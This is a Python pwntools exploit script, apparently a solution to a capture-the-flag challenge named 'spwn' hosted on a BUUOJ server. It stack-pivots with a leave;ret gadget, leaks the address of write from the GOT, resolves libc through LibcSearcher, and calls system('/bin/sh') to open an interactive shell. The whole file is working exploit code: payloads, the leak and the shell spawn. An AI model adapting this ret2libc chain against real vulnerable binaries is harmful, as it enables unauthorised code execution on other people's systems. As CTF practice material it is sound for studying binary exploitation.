from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)
#
#
context(os='linux', arch='i386', log_level='debug')
binary = './spwn'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',25352) if argv[1]=='r' else process(binary)

leave_ret = 0x08048511
s_addr = 0x0804A300

vul_addr = elf.sym['main']
write_plt = elf.plt['write']
write_got = elf.got['write']

payload1 = b'a'*4 + p32(write_plt) + p32(vul_addr) + p32(1) + p32(write_got) + p32(4)
io.sendafter(b'Hello good Ctfer!',payload1)  #不能用sendline要用send，原因还不太了解，但是搞了好久才测出来是这个原因导致失败
payload2 = cyclic(0x18) + p32(s_addr) + p32(leave_ret)
io.sendafter(b'What do you want to say?',payload2)

write_addr = u32(io.recv(4))
system_addr,binsh_addr = ret2libc(write_addr,'write')

payload3 = b'a'*4 + p32(system_addr) + p32(vul_addr) + p32(binsh_addr)
io.sendafter(b'Hello good Ctfer!',payload3)
io.sendafter(b'What do you want to say?',payload2)
io.interactive()

